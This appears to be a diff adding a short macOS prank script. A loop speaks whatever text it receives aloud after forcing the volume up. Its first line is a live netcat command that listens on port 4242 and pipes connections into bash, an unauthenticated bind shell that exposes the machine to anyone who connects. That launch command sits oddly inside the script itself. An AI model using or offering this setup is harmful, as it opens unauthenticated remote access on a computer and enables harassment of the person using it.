@@ -1,0 +1,10 @@
+mkfifo foo ; nc -lk 4242 0<foo | /bin/bash 1>foo ./cool.sh
+
+while :
+do
+  read saythis
+  SOUND_LEVEL=`osascript -e "get volume settings" | cut -d':' -f 2 | cut -d',' -f 1`
+  osascript -e "set Volume 10"
+  say $saythis
+  osascript -e "set Volume $SOUND_LEVEL"
+done
